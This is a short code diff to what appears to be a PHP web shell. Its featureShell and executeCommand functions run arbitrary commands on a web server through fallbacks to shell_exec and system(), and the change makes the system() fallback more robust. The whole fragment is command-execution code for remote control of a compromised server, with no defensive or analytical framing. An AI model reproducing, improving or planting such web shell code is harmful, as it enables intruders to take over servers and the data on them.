@@ -10,7 +10,7 @@ function expandPath($path) {
 
 function featureShell($cmd, $cwd) {
     $stdout = "";
-    
+
     if (preg_match("/^\s*cd\s*(2>&1)?$/", $cmd)) {
         chdir(expandPath("~"));
     } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
@@ -39,7 +39,7 @@ function executeCommand($cmd) {
         $output = implode("\n", $output);
     } else if (function_exists("shell_exec")) {
         $output = shell_exec($cmd);
-    } else if (function_exists("system")) {
+    } else if (allFunctionExist(["system", "ob_start", "ob_get_contents", "ob_end_clean"])) {
         ob_start();
         system($cmd);
         $output = ob_get_contents();
